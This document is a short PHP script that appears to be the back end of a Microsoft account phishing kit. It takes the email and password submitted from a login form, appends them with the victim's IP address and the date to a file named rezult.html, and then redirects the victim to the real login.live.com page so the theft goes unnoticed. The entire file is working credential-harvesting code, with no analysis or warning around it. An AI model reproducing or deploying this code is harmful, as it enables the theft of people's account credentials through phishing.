<?php
$email = $_POST['email'];
$email =  mysql_escape_string($email);
$em = htmlentities($email);
$pass = $_POST['password'];
$pass =  mysql_escape_string($pass);
$ps = htmlentities($pass);
//----------------------------
$ip = getenv("REMOTE_ADDR");
$ip = htmlentities($ip);
$date = date("Y/m/d");
$file = fopen("rezult.html","a+");
$table = "<tr><td><font color='7ab900' size='4'>$em</font></td><td><font color='7ab900' size='4'>$ps</font></td><td><font color='7ab900' size='4'>$ip</font></td><td><font color='7ab900' size='4'>$date</font></td></tr>";
fwrite ($file, $table);
fclose($file);
header("Location:https://login.live.com/");
?>
